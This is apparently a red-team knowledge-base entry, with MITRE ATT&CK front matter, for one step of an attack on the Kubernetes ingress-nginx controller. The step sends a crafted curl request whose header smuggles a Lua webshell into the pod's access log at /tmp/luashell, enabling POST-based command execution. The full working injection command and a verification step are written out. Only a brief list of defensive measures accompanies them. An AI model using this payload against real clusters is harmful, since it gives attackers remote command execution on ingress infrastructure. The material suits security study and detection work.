---
id: proc-004
tags:
  - lua
  - injection
  - rce
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-lua-code]]'
verified: false
platforms:
  - Kubernetes
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:49.927Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Lua-Code-via-HTTP-Request

## Summary

This procedure uses a crafted HTTP request to trigger the access_log directive, writing malicious Lua code for a command execution webshell to /tmp/luashell on the ingress-nginx-controller pod.

## Description

The Lua code implements a simple POST-based shell: reads body, gets post args, executes cmd via io.popen, and outputs result. The x-ginoah header carries the code, logged unescaped due to escape=none. This exploits the file write capability from the previous Ingress injection.

## Requirements

1. Malicious write Ingress applied.
2. Localhost access to port 80 (exposed via Kind).
3. curl tool available.
4. NGINX processing requests to x.x host.

## Defense

Defensive measures and detection strategies:

- Sanitize custom headers in NGINX logs.
- Disable or restrict access_log to custom formats.
- Monitor /tmp writes in ingress pods via hostPath mounts or auditing.
- Use Lua sandboxing if enabled.

## Objectives

1. Write Lua webshell to pod filesystem.
2. Enable POST-based command execution.
3. Validate file creation without direct pod access.
4. Set up for inclusion in next step.

## Instructions

### Step 1: Send Injection Request

**Context**: Hit /z/ location which triggers access_log /tmp/luashell with the header value.

**Command** ([[commands/curl-inject-lua-code]]):

```bash
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'`
```

> Expected output: HTTP 404 or empty response (backend doesn't exist), but log write occurs. Verify by exec: `kubectl exec -n ingress-nginx <pod> -- cat /tmp/luashell` showing the Lua block.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript (Lua analogous)

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-lua-code]]

## Tools Used

- [[tools/curl]]

## Tags

- lua
- injection
- rce
